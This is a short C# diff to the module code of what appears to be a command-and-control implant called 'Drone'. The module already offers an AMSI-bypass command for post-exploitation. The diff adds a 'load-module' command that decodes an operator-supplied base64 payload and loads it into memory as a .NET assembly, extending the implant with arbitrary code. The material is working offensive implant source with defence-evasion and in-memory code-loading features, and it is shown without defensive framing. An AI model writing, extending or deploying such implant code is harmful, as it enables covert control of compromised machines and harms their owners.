@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Reflection;
 using System.Threading;
 
 using Drone.Models;
@@ -20,7 +21,11 @@ namespace Drone.Modules
             var amsi = new Command("bypass-amsi", "Bypass AMSI for post-ex tasks", BypassAmsi);
             amsi.Arguments.Add(new Command.Argument("true/false"));
 
+            var load = new Command("load-module", "Load an external Drone module", LoadModule);
+            load.Arguments.Add(new Command.Argument("/path/to/module.dll", false, true));
+
             Commands.Add(sleep);
+            Commands.Add(load);
             Commands.Add(amsi);
             Commands.Add(exit);
         }
@@ -45,6 +50,15 @@ namespace Drone.Modules
         private void ExitDrone(DroneTask task, CancellationToken token)
         {
             Drone.Stop();
+        }
+        
+        private void LoadModule(DroneTask task, CancellationToken token)
+        {
+            var bytes = Convert.FromBase64String(task.Artefact);
+            var asm = Assembly.Load(bytes);
+            
+            Drone.LoadDroneModule(asm);
+            Drone.SendResult(task.TaskGuid, $"Module {asm.GetName().Name} loaded.");
         }
     }
 }
